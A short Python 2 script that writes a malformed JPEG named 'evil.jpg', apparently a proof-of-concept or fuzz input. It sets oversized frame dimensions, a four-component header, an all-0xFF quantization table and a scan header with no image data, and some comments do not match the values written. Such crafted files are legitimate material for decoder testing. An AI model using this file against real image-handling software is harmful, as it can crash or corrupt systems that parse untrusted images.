
def main():
    with open('evil.jpg', 'w') as f:
        # Start of Image
        f.write('\xff\xd8') # marker

        # APP0
        f.write('\xff\xe0') # marker
        f.write('\x00\x10') # size
        f.write('JFIF\x00') # 
        f.write('\x01\x02') # version 1.2
        f.write('\x00')     # no density units
        f.write('\x00\x01') #  no horizontal scaling
        f.write('\x00\x01') #  no vertical scaling
        f.write('\x00\x00') #  0x0 thumbnail

        # Start of Frame
        f.write('\xff\xc0') # marker
        f.write('\x00\x14') # size
        f.write('\x08')     # precision 8 bits
        f.write('\xff\xdb') # height (64K)
        f.write('\xff\xdb') # width (64K)
        f.write('\x04')     # four color components
        f.write('\x01\x11\x00')
        f.write('\x02\x11\x00')
        f.write('\x03\x11\x00')
        f.write('\x04\x11\x00')

        # Quantization Table 0
        f.write('\xff\xdb') # marker
        f.write('\x00\x43') # size
        f.write('\x00') # 8 bit sampling & ID 0
        for i in xrange(64):
            f.write('\xff')

        # Huffman table 0 DC
        f.write('\xff\xc4') # marker
        f.write('\x00\x14') # size
        f.write(''.join(map(chr, [0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0])))

        # Huffman table 0 AC
        f.write('\xff\xc4') # marker
        f.write('\x00\x14') # size
        f.write(''.join(map(chr, [16,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0])))

        # Start of Scan
        f.write('\xff\xda') # marker
        f.write('\x00\x0e') # size
        #f.write('\x00\x08') # size
        f.write('\x04')     # three color components
        f.write('\x01\x00') # huffman table 0
        f.write('\x02\x00') # huffman table 0
        f.write('\x03\x00') # huffman table 0
        f.write('\x04\x00') # huffman table 0
        f.write('\x00\x3f\x00') # ???
        # We won't write any data.  

        f.write('\xff\xd9')


if __name__ == '__main__':
    main()
